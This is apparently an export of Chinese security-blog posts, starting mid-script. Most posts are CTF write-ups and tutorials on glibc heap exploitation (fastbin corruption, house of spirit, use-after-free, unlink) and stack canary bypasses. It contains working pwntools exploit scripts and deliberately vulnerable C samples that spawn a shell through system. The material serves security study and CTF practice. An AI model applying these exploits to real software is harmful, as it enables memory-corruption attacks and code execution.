p64(0x90)edit(0,0x40,payload)delete(1)payload = &#39;a&#39; * 24 +p64(0x4040a8)+p64(0x4040a0)edit(0,len(payload),payload)payload = p64(0x7e4)edit(1,len(payload),payload)r.recvuntil(&#39;Your choice : &#39;)r.sendline(&#39;70&#39;)#gdb.attach(r)#edit(0,)r.interactive()</code></pre><h3 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h3><p>跟上面属实一个题目，不多说了。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;r = process(&#39;./pwn15&#39;)def new(size,text):    r.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)    r.sendlineafter(&#39;Length of note:&#39;,str(size))    r.sendafter(&#39;Content of note:&#39;,text)def edit(idx,size,text):    r.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)    r.sendlineafter(&#39;Index:&#39;,str(idx))    r.sendlineafter(&#39;Length of note:&#39;,str(size))    r.sendafter(&#39;Content of note:&#39;,text)def dele(idx):    r.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)    r.sendlineafter(&#39;Index:&#39;,str(idx))data = 0x000000000602088ptr = 0x0000000006020C0new(0x20,&#39;aa&#39;)new(0x80,&#39;aa&#39;)fake_chunk = [    0,0x20,    ptr - 0x18,ptr - 0x10,]payload = flat(fake_chunk) + p64(0x20) + p64(0x90)edit(0,len(payload),payload)#gdb.attach(r)dele(1)payload = 0x18 * &#39;a&#39; + p64(data)edit(0,len(payload),payload)edit(0,0x8,p64(0x7e4))r.sendlineafter(&#39;Your choice:&#39;,&#39;2019&#39;)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap Fastbin Corruption</title>
      <link href="/2019/08/16/glibc-heap-fastbin-corruption/"/>
      <url>/2019/08/16/glibc-heap-fastbin-corruption/</url>
      
        <content type="html"><![CDATA[<p>基础知识：</p><ul><li>fastbin: Chunk Size &lt;= get_max_fast()的chunk（其实就是64bits的是128bytes，32位的是64bytes）  ，它们会被放在被称为fastbin的bin里面</li></ul><img src="/2019/08/16/glibc-heap-fastbin-corruption/1.png" title="This is an image"><p>上面的fastbinsY 里面存放fastbin , 最大是128bytes,最小是32bytes,然后依次加16bytes,32位的类似，不过最大是64bytes</p><ul><li>需要注意的是get_max_fast()事实上返回的是 global_max_fast，但是这个值得初始值为0，只有当第一次malloc之后它才会被赋值为相应的值</li><li>同时fastbin是Single linked list，所以它只使用fd,以NULL结尾</li><li>free的时候呢，不取消下一个chunk 的prev_inuse bit，因为fastbin chunk不会和其他chunk合并</li><li>malloc 和 free的时候glibc会有一些检查，确认heap metadata是否正确，避免一些可能的攻击方式</li><li>fastbin执行效率高，它的里面的检查比其他类型的bin少很多</li><li>fastbin的linklist和其他的相反，跟Stack很像free和malloc的时候先进后出</li><li>fastbin的prev_inuse标志位在free的时候不会改变还是1，这防止了它和其他的free_chunk进行合并操作</li></ul><p>Fastbin Corruption：</p><pre><code>1..让fastbin linked list 指向任意位置，之后的malloc时就会把改地址当做chunk拿出来 2.free（not in_use）的chunk会被存在bin里面，修改它的fd才会造成corruption    1.double free    2.Over flow</code></pre><p>fastbin的检查方式：</p><ul><li>malloc从bin里面取出chunk,要拿到合适大小的chunk（检查你这个chunk的chunk_size</li><li>free的时候，next_chunk的size必须正确（overflow的时候才会用到）</li><li>free时看看bin里面的第一个chunk和现在要free的是不是同一个（fasttop），这个的缺点就是它只和第一个检查，那么你可以在double free之前先free一个其他的大小合适的chunk</li></ul><p>我们可以看源码了解一下（源码我会的不多，只说点关键的）<br>对应1：</p><pre><code>    //这个nb是chunk的bytes 它来源于上面的一个checked_request2size(bytes,nb) 这的作用就是malloc的bytes+8然后16对齐        if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))   //chunk的size(nb)小于128 or 64的话就会执行下面        {               idx = fastbin_index(nb);     //这是在fastbin里面找，把chunk的size转换成fastbin里面对应的哪一个（size/16-2）注意：0是fastbin的第一个               mfastbinptr *fb = &amp;fastbin(av, idx);               mchunkptr pp;               victim = *fb;               if (victim != NULL)               {                       if (SINGLE_THREAD_P)                              *fb = victim-&gt;fd;                       else                              REMOVE_FB(fb, pp, victim);                       if (__glibc_likely(victim != NULL))                       {                              size_t victim_idx = fastbin_index(chunksize(victim));   //victim是要等一下要return的chunk                              if (__builtin_expect(victim_idx != idx, 0))      //这边就是在检查你拿出来的chunk的idx跟bin的idx是不是一样，不对的话error                                      malloc_printerr(&quot;malloc(): memory corruption  (fast)&quot;);</code></pre><p>对应2：</p><pre><code>               if (SINGLE_THREAD_P)               {                       /* Check that the top of the bin is not the record we are going to                          add (i.e., double free).  */                       if (__builtin_expect(old == p, 0))   //这个检查就是看看你free的chunk跟bin里面的chunk是不是同一个，同一个的话就error                              malloc_printerr(&quot;double free or corruption (fasttop)&quot;);                       p-&gt;fd = old;                       *fb = p;               }</code></pre><p>double free也会形成类似UAF的效果，可以改掉bin里面的chunk的fd，可以看一下调试截图和源码</p><pre><code>int main(){    void *p,*q,*r,*s;    p = malloc(30);    q = malloc(30);    free(q);    free(p);    free(q); 第一次断点下在这里}</code></pre><img src="/2019/08/16/glibc-heap-fastbin-corruption/2.png" title="This is an image"><img src="/2019/08/16/glibc-heap-fastbin-corruption/3.png" title="This is an image"><img src="/2019/08/16/glibc-heap-fastbin-corruption/4.png" title="This is an image"><p>更重要的是，现在bin里面有两个q（其实是同一块）都指向了P，<br>利用姿势注意点：</p><ol><li><p>取出的chunk 的size要正确，所以也不是任意地址，需要可以制作假的size</p><ol><li>stack上的变量做size ，可以malloc出一个stack上的位置  （可以制作stack上的overflow）</li><li>got上，用64bits地址常见的0x40（这个got没被call过的话）做size</li></ol></li><li><p>取得chunk后，有机会对改地址任意写</p></li></ol><p>fastbin double free:</p><ol><li>fasttop只检查bin里面的第一个chunk,只要不是连续free同一个chunk就没关系</li><li>double free有类似use after free的效果，可以改掉bin里面的chunk的fd</li></ol><p>例子：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;void sh(char *cmd){    system(cmd);}int main(){    setvbuf(stdout,0,_IONBF,0);    int cmd,idx,sz;    char *ptr[10];    memset(ptr,0,sizeof(ptr));    puts(&quot;1. malloc + gets\n2. free\n3. puts&quot;);    while(1)    {        printf(&quot;&gt; &quot;);        scanf(&quot;%d %d&quot;,&amp;cmd, &amp;idx);        idx %= 10;        if(cmd==1)        {            scanf(&quot;%d%*c&quot;,&amp;sz);            ptr[idx] = malloc(sz);            gets(ptr[idx]);        }        else if(cmd==2)        {            free(ptr[idx]);        }        else if(cmd==3)        {            puts(ptr[idx]);        }        else        {            exit(0);        }    }    return 0;}</code></pre><p>在64位机器上这个题目有个经典的手法来必过fastbin的检查，因为malloc必须要拿到合适的chunk,所以你malloc的chunk的size位必须要跟fastbin里面的chunk的size大小相同，我们可以在构造fastbin的时候用到了double free,这个操作就是先随便malloc2个大小一样的chunk p和q（必须是fastbin的大小）,我们一次free p q p，那么就会绕过一个fastbin检测，同时这个double free也会形成一个类似环状的fastbin<br><img src="/2019/08/16/glibc-heap-fastbin-corruption/5.png" title="This is an image"><br>那么在malloc的时候，如果从这个bin里面获取chunk的话，我们就可以通过三次malloc，两次使用chunk p,这样就可以利用gets实现有限制的地址写入，这个限制就来源于chunk大小检查，同样我们可以利用64位机器好多都是0x40,来将malloc的chunk p利用gets修改到got表的相应位置，那么第三次malloc就会把这个地址的内存当做一个chunk来取出来，进行gets，我们写入shell的地址，那么下次调用got表相应函数的时候就直接getshell</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2019/08/16/chunk-extend-and-overlapping/"/>
      <url>/2019/08/16/chunk-extend-and-overlapping/</url>
      
        <content type="html"><![CDATA[<p>chunk extend 堆利用：<br>    程序中堆的利用 可以控制chunk header中的数据 例如：heap overflow<br>ptmalloc 对chunk 操作的存在漏洞。</p><p>首先：怎么获取chunk的大小？</p><pre><code>/* Get size, ignoring use bits */#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))/* Like chunksize, but do not mask SIZE_BITS.  */#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</code></pre><p>其实就是利用了size , 但是一种忽略了掩码部分，一种没有。</p><p>那么怎么获取下一个chunk的位置？<br>这个其实就是利用了隐式链表的技术</p><pre><code>/* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</code></pre><p>就是当前块指针加上当前块的大小。</p><p>那么有关前一个chunk的信息呢？<br>答案还在malloc_chunk的结构体里面，</p><pre><code>/* Size of the chunk below P.  Only valid if prev_inuse (P).  */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</code></pre><p>但是这一点的时候要特别注意malloc 和free两种不同的状态。<br>上面简单就是用本chunk - malloc_chunk-&gt;prev_size<br>那么判断是否处于in_use状态就是依靠in_use标志位了</p><pre><code>#define inuse(p)    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</code></pre><p>记住一点：本chunk的 in_use表示的是前一个chunk的状态哦。<br>综合起来chunk的判断 就是依赖于malloc_chunk结构体里面的内容，简单来说就是chunk_header<br>,那么利用思路就自然而然的出来了，我们通过堆漏洞（heap overflow之类的）可以改变chunk_header进而实现漏洞利用</p><p>下面来几个简单的实操：<br>    1.在fastbin 里面的操作：</p><pre><code>/*************************************************************************    &gt; File Name: chunk_extend.c    &gt; Author: 时钟    &gt; Mail: 522796871@qq.com    &gt; Created Time: 2019年08月16日 星期五 11时30分15秒 ************************************************************************/#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){    void *p , *c;    p = malloc(0x10);    malloc(0x10);    *(long long*)((long long)p-0x8) = 0x41;    free(p);    c = malloc(0x32);    return 0;}</code></pre><p>当我们free之后：<br><img src="/2019/08/16/chunk-extend-and-overlapping/1.png" title="This is an image"><br>这接下来的malloc 就可以成功的控制下面的malloc ， 相当于两个指针可以操作同一个chunk了哦。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位 house of spirit</title>
      <link href="/2019/08/03/64-wei-house-of-spirit/"/>
      <url>/2019/08/03/64-wei-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>这个题目有问题，但是重要的是利用思想：可以把源码贴出来帮助理解：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char buf[128];  /*值得注意的是这几个全局变量在bss段是紧挨着排列的*/char *ptr[8];char *cmd;    //fake_chunk要把这个包含进去，这样的话就可以利用fgets实现任意地址写入int size;int n = 0;void sh(char *c){    system(c);}int main(){    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = buf;    while(1)    {        fgets(cmd,sizeof(buf),stdin);        if(!strncmp(cmd,&quot;push&quot;,4))   //strncmp意思是只比较前4个        {            if(n&lt;8)            {                scanf(&quot;%d%*c&quot;,&amp;size);   //这里可以写入size 进而伪造next_chunk_size                ptr[n] = malloc(size);                fgets(ptr[n],size,stdin);                n++;            }            else            {                puts(&quot;stack is full&quot;);            }        }            else if(!strncmp(cmd,&quot;pop&quot;,3))            {                if(n&gt;=0)                {                    n--;                    puts(ptr[n]);                    free(ptr[n]);                    ptr[n] = 0;                }                else                {                    puts(&quot;stack is empty&quot;);                }            }            else{                puts(&quot;unkonwn command&quot;);            }        }    }</code></pre><p>file得知是64位动态链接程序，那么看看ida分析   （push指针共有8个，图里面写错了）<br><img src="/2019/08/03/64-wei-house-of-spirit/1.png" title="This is an image"><br>那么我们的第一步就是伪造chunk ，这一点需要注意的就是地址要16位对齐，否则free的时候无法绕过检查，我们可以把size写入为next_chunk_size来躲过检查，然后把伪造的chunk free掉，然后就是malloc写入把cmd给溢出指向fgets@got，然后fgets把strncmp@got给覆盖了（因为下一个执行的就是strncmp,然后fgets@got的最后2个byte地方可以放参数/bin/sh,其它的可以用00填充 ），下次调用就直接getshell</p>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stack cookie探索</title>
      <link href="/2019/08/03/stack-cookie-tan-suo/"/>
      <url>/2019/08/03/stack-cookie-tan-suo/</url>
      
        <content type="html"><![CDATA[<p>stack cookie的两种讲法</p><ul><li>windows平台上叫 /GS:cookie</li><li>linux上叫Stack Canary</li></ul><p>它的原理就是在ebp-4的地方插入一个随机数（4字节还是8字节看计算机位数了），然后在函数返回（return）的时候会调用另一个函数去检查这个值是否被修改，如果被修改了的话就终止程序，这就使得经典栈溢出的手法难以奏效</p><ul><li>首先在windows平台上，在vs编译的时候有那个安全选项可以加上，然后在调试的时候就直接看函数，我们会发现在以前的经典的push ebp   mov ebp esp , sub esp , 88h这些之后呢，还会有一个mov eax , dword prt [stack_overflow_gs!_security_cookie(00416000)]            xor eax,ebp 这样类似的东西，这个其实就是添加一个随机数进去，然后在程序的结束部分还有一个对应的操作 mov ecx,doword prt [ebp-4]   xor ecx,ebp  call stack_overflow_gs!ILT_25(_security_check_cookie)(00416000)这类操作（具体代码可能不一样但是都是这个意思）</li><li>下面详细说一下：</li><li><p>调试可以发现那个cookie的初始值0041600其实就是.data段的起始地方，在程序运行得时候这里面是个随机数字，但是你在原始文件的PE里面可以看，.data段的值不是全部一样的，为啥呢？其实是在start函数后的有一个_mainCRTStartup的一个库启动的时候有一个函数调用__security_init_cookie 下面是ida里面的情况</p><img src="/2019/08/03/stack-cookie-tan-suo/1.png" title="This is an image"><p>我们可以看出cookie的值有一套自己的计算逻辑，基本上是以系统时间，进程id,性能计数器等作为可变元</p></li><li><p>stack_overflow_gs!ILT_25(_security_check_cookie)这个函数做了什么？  其实里面就是一个cmp 的比较不相等的话跳到函数里面的另一个函数里（这个函数就是终止程序啦，反馈信息了，这么一些个操作），OK   windows上差不多就这些。</p></li></ul><p>下面这个讲linux上的cookie，这个是当前时期的重点：</p><ul><li><p>首先它跟windows第一点的不同就是代码顺序</p><img src="/2019/08/03/stack-cookie-tan-suo/2.png" title="This is an image"></li><li><p>它这个其实是在栈开辟完成后进行的一盘操作而且我们也看到了，这个canary的位置是在ebp - 0xc的位置，然后要知道的一点就是cookie的初始化是在glibc里面进行的，但是不要认为cookie是glibc生成的，其实是内核给的glibc</p></li><li>然后还是最后有个检查嘛</li><li><img src="/2019/08/03/stack-cookie-tan-suo/3.png" title="This is an image"></li></ul><p>下面最最重要的当然是破解手法了：</p><ol><li>其一肯定是暴力破解cookie值，但是这个应用场景有限，你要是没啥前提条件单纯的跑程序的话，cookie的值每次都会变，估计你就呵呵呵了，那么，这个前提条件就是子进程存在栈溢出漏洞（linux上子进程跟父进程之间关系严格）这个意思就是子进程无限的fork，因为在这个时候它的哪个cookie事实上是继承的父进程的cookie，那么父进程fork的时候给子进程的cookie都是哪一个，那么你就暴力破解吧。</li><li>leak info(OOB read，file log)  意思就是程序还存在其他漏洞，想越界读取啊 ， 格式化字符串啊， 其他的一些输出函数啊 ，那么我们调整一些参数，利用这些漏洞可以得到Cookie的值啊。</li><li>迂回绕过，这意思就是我们可以避开cookie的检查（例如我们可以不修改你的ebp , ret_addr，我们就简单的修改你的局部变量来改变程序流程）</li><li>这个就是我们既然得不到cookie, 那么意思就是__stack_chk_fial@plt这个函数非要执行不可了，那我们可以把这个函数给got劫持了，把它里面.got.plt那个地址改成我们shellcode的地址。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap House of Spirit</title>
      <link href="/2019/08/03/glibc-heap-house-of-spirit/"/>
      <url>/2019/08/03/glibc-heap-house-of-spirit/</url>
      
        <content type="html"><![CDATA[<p>这个技术也是针对于fastbin，属于fastbin_attack的一种。<br>关键：目标位置伪造fastbin chunk并将其释放，进而实现在指定地址分配chunk</p><p>关于free时候的检查：</p><ul><li>free检查会看size的低字节flag的IS_MMAP标志位，M标志位没有被置1才会绕过检查，否则就会调用munmap_chunk函数去释放堆块</li></ul><p>1.free的chunk的size不可以太离谱，不要太大太小，并且chunk要对齐</p><pre><code>       if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0)               || __builtin_expect(misaligned_chunk(p), 0))               malloc_printerr(&quot;free(): invalid pointer&quot;);        /* We know that each chunk is at least MINSIZE bytes in size or a           multiple of MALLOC_ALIGNMENT.  */        if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))               malloc_printerr(&quot;free(): invalid size&quot;);</code></pre><p>2.free的时候也会检查当前Chunk的下一个chunk，也是不能太小不能太大（大于2*SIZE_SZ小于system_mem）其中SIZE_SZ在32位上是4，64位上是8</p><pre><code>if (__builtin_expect(chunksize_nomask(chunk_at_offset(p, size))                       &lt;= 2 * SIZE_SZ, 0)                       || __builtin_expect(chunksize(chunk_at_offset(p, size))                              &gt;= av-&gt;system_mem, 0))</code></pre><p>检查绕过：</p><ul><li>fake chunk 的ISMMAP位不能是1 ，因为free的时候如果 是mmap的话 会被单独 处理</li><li>fake chunk 的地址需要对齐</li><li>fake chunk的size大小满足fastbin，并且对齐</li><li>fake chunk的size大小不能小于2*SIZE_SZ（4或者8），同时不能大于av-&gt;system_mem。</li><li>fake chunk对应的fastbin链表头部不能是该fake chunk，即是不能构成double free的情形</li></ul><p>利用条件：</p><ol><li>想要控制的区域的前段空间和后端空间都是内存可控的<br> 1.我们想要控制的目标内存一般是返回地址或者函数指针 ，这个应该属于.text段，所以一般情况下这段内存是我们的输入无法控制的，就是我们控制不了的意思。</li></ol><p>2.存在可将堆变量指针覆盖指向为可控区域，即上一步中的区域</p><p>how2heap里面的相关源码我们可以看一下：</p><pre><code>配出来的时候，就有可能改写我们目标区域。还是像以前一样，先上一段代码给大家一个直观印象再具体解释，这段代码是shellfish的github里面的源码。  #include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  int main()  {         printf(&quot;This file demonstrates the house of spirit attack.n&quot;);         printf(&quot;Calling malloc() once so that it sets up its memory.n&quot;);         malloc(1);        printf(&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.n&quot;);        unsigned long long *a;        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));        printf(&quot;This region must contain two chunks. The first starts at %p and the second at %p.n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[7]);        printf(&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;);        printf(&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;);        fake_chunks[1] = 0x40; // this is the size        printf(&quot;The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av-&gt;system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .n&quot;);        fake_chunks[9] = 0x2240; // nextsize        printf(&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;, &amp;fake_chunks[1]);        printf(&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;);        a = &amp;fake_chunks[2];        printf(&quot;Freeing the overwritten pointer.n&quot;);        free(a);        printf(&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);        printf(&quot;malloc(0x30): %pn&quot;, malloc(0x30));}</code></pre><p>解析和思路：</p><ol><li>伪造堆块：在可控区域输入数据进而把它伪造成为一个fastbin</li><li>覆盖堆指针指向上一步伪造的堆块</li><li>释放堆块，讲伪造的堆块释放到fastbin单链表里面</li><li>申请堆块，讲刚释放的堆块申请出来，最终使得可以向目标内存里面写入数据</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程小知识</title>
      <link href="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/"/>
      <url>/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p>在VB中：<br><strong>vbaVarForInit() , </strong>vbaVarForNext() 可以使逆向分析人员在字符串对象中逐个引用字符。 后面可以跟loop count (EBX) 使其按指定次数运转循环</p><pre><code>MSVBVM50.rtcMsgBox  \\调用消息框</code></pre><p>入口点：<br>    调试器载入程序后停止的地方为入口点，它是一段EP（EntryPoint，入口点）代码，其中最引人注意的是CALL 和 JMP 两个命令<br><img src="/2019/08/02/ni-xiang-gong-cheng-xiao-zhi-shi/1.png" title="This is an image"><br>EP:<br>    EP是windows可执行文件（EXE,DLL,SYS等）的代码入口点，是执行应用程序时最先执行的代码的起始位置，它依赖于CPU</p><p>查找main函数的方法：<br>    简单有效：F7,F8查看函数 （一些经验就是可以通过注释区的注释直接步过一些函数列如一些winAPI）</p><p>大本营：<br>    为了重复加载程序方便，我们可以在一些地方下断点防止一些麻烦（就比如不用一次次的找main函数）</p><ol><li>GOTO 命令（Ctrl+G）然后 F4</li><li>设置断点</li><li>加上注释（快捷键 ; ）</li><li>加上标签 （快捷键 : ）</li></ol><p>快速查找指定代码的四种方法：    </p><ol><li>代码执行法</li><li>字符串检索法</li><li>API检索法（1）：程序没有压缩器/保护器的保护  用All intermodular calls 生成API函数列表</li><li>API检索法（2）：存在（1）中情况   此时DLL代码库被加载到内存后，我们可以直接向DLL库中添加断点 （快捷键Alt + M 打开内存映射窗口可以查看一些进程内存和USER32库的加载情况），同时 Name in all modules可以列出所被加载的DLL文件中提供的API</li></ol><p>函数调用约定：<br>  cdecl:<br>    调用者直接清理其压入栈的函数参数<br>   stdcall:<br>    一个使用例子</p><pre><code>#include &quot;stdio.h&quot;int _stdcall add(int a ,int b){    return a+b;}int main(){    return add(1,2);}</code></pre><p>  这种方式是用被调用函数自己清理栈，其汇编结尾 一般用 RETN+一个数字（栈大小）<br>  fastcall:<br>  与stdcall方式基本相似，但是该方式通过使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前两个）一般为ECX,EDX</p><ul><li>逆向工程中函数调用的返回值一般保存在eax中，在程序call指令之后一般就会有对eax寄存器的处理，这一点可以用来判断函数的用途和结构</li><li><p>.逆向工程中确定函数参数多少的方法：</p><pre><code>进入函数后可以看到它栈空间中存储的返回地址，通过该返回地址你可以找到调用该函数的起始地址，然后可以分析在进入函数体前后的栈空间大小来确定参数多少</code></pre></li><li><p>一些逆向可能会直接在程序内部存在注册码，可以通过找到注册码错误的字符串确定比较注册码正确与否的函数，而在改函数的附近一般会存在正确的注册码。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap UAF</title>
      <link href="/2019/08/02/glibc-heap-uaf/"/>
      <url>/2019/08/02/glibc-heap-uaf/</url>
      
        <content type="html"><![CDATA[<p>use after free（UAF）</p><ul><li>重新malloc一样的大小，会拿到曾经Free的chunk，此时就会有两个指针p，和q指向同一个内存块，使用这两个的指针操作混在一起（之前的哪个指针在chun被free后没有被置为NULL，形成悬空指针）</li><li>还有一个小点就是要注意在64bits的时候有可能会出现高位的\x00截断这种事情</li><li>这个关键的一点就是free掉的内存块，还是可以再次拿出来用的，就想之前free的chunk，malloc的也可以再次拿出来，我们看一个例子</li></ul><pre><code>#include&lt;stdio.h&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;class A{    public:        virtual void print()        {            puts(&quot;class A&quot;);        }};class B:public A{    public:        void print(){            puts(&quot;class B&quot;);        }};void sh(){    system(&quot;sh&quot;);}char buf[1024];int main(){    setvbuf(stdout,0,_IONBF,0);   \\这个setvbuf是C库函数，作用跟参数有关，可以百度一下，目前的作用是    A *p = new B();    delete p;    fgets(buf,sizeof(buf),stdin);    char *q = strdup(buf);   \\这个其实就是有一个malloc分配内存块然后把字符串打印进去    p-&gt;print();}</code></pre><p>然后就要分析一下这个源码，首先看一下strdup的源码，这个函数定义在string.h这个头文件之中，</p><pre><code>char * __strdup(const char *s){   size_t  len = strlen(s) +1;   void *new = malloc(len);   if (new == NULL)      return NULL;   return (char *)memecpy(new,s,len);}</code></pre><p>那么我们开始走程序，我们在delete p下断点执行程序，然后看ida先分析一下，<br><img src="/2019/08/02/glibc-heap-uaf/1.png" title="This is an image"><br>我们可以看到申请了是8bit的内存空间，但是对齐到最后应该会生成一个32位大小的堆块，进GDB<br><img src="/2019/08/02/glibc-heap-uaf/2.png" title="This is an image"><br>我们看到分配的mem在rax里面，而且目前mem刚申请出来，还都是0，其实也可以看到，下面有一个清0的操作，下面来个图带解释<br><img src="/2019/08/02/glibc-heap-uaf/3.png" title="This is an image"><br>call B之后内存块是这样的<br><img src="/2019/08/02/glibc-heap-uaf/4.png" title="This is an image"><br>然后紧接着的delete就给全清0了<br><img src="/2019/08/02/glibc-heap-uaf/5.png" title="This is an image"><br>然后紧接着fgets 输入8个a ，输入到了0x601160这个bss段，然后就指向strdup函数，然后把bss段的东西读入到新申请的mem<br><img src="/2019/08/02/glibc-heap-uaf/6.png" title="This is an image"><br>这时候我们惊喜的发现我们之前的chunk被拿出来用了，被填上了我们的输入，那么因为之前那个指针p没有被置为NULL,所以它还是指向这里的，我们可以利用此来劫持函数流，因为源代码的下面,还可以看看ida里面，有一个p的调用：<br><img src="/2019/08/02/glibc-heap-uaf/7.png" title="This is an image"><br>接下来利用过程就很关键了：<br><img src="/2019/08/02/glibc-heap-uaf/8.png" title="This is an image"><br>我们就可以开做题了：</p><pre><code>#coding:utf-8from pwn import *r = process(&#39;./use-after-free&#39;)buf = 0x601160system_sh = 0x000000000400906r.sendline(p64(buf+8)+p64(system_sh))     #这个送过去的数据不能太大，太大的话就不会申请的原来的chunk,如果想要刚刚好的话是24byte,不过这个不用刚刚好，因为chunk补齐，chunk的最小刚好是32byte,+8是因为对输入的地址要进行解引用的，可以看细看解析的最后一部分r.interactive()</code></pre><p>下面这个是个32位的例子，来自安全客，看题目源码：</p><pre><code>#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);   //定义了一个函数指针，参数类型char *,没有返回值void evil_fuc(char command[]){    system(command);}void echo(char content[]){    printf(&quot;%s&quot;,content);}int main(){    func_ptr *p1=(int*)malloc(4*sizeof(int));    printf(&quot;malloc addr: %pn&quot;,p1);    p1[3]=echo;   //这个代表的是分配出来的内存块的第四个    p1[3](&quot;hello worldn&quot;);    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针    p1[3](&quot;hello againn&quot;); //p1指针未被置空,虽然free了,但仍可使用.    func_ptr *p2=(int*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.    printf(&quot;malloc addr: %pn&quot;,p2);    printf(&quot;malloc addr: %pn&quot;,p1);//p2与p1指针指向的内存为同一地址    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.    p1[3](&quot;whoami&quot;);   //p1这个指针跟先前的操作一样，本来是要传个参数给echo，但是因为被p2改成evil_fuc,参数就给了evil,当然这里换成p2也可以的    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap unlink漏洞</title>
      <link href="/2019/08/02/glibc-heap-unlink-lou-dong/"/>
      <url>/2019/08/02/glibc-heap-unlink-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>知识点：</p><ol><li>free操作会检查前后相邻堆块是否in_use，空闲的话就会进行合并操作</li><li>空闲的堆块一般以双向链表的形式存在（fastbin是单向链表不适用此种攻击）</li><li>unlink : 如果刚释放的堆块要与前面或者后面的堆块进行合并操作，那么需要把前面或者后面的堆块从双向链表中摘取下来，合成更大的堆块插入到别的bin之中，将空闲堆块从bin里面摘取下来的操作就是unlink</li><li>chunk中的flag标志位 ： flag来源 ，size字节需要8字节对齐，就会空余出来3个bit, 其中最低位表示前一个chunk是否在使用，倒数第二位表示这个chunk是否通过mmap的方式产生，第三个表示 该chunk是否属于一个线程的arena</li><li>fd : 指向下一个空闲的chunk，bk指向上一个空闲的chunk</li><li>下面是一个往前合并的源码 ：值得注意的就是free在unlink的时候是先进行backward 然后 forward<pre><code>             /* consolidate backward 往前合并*/            if (!prev_inuse(p)) {     //先检查要free chunk的上一个chunk是不是 in_use，不是的话就往下操作                    prevsize = prev_size(p);   //取p的前一个chunk的size（利用的是p chunk的prev_size）                    size += prevsize;    //free_chunk的size + 上一个chunk的size                    p = 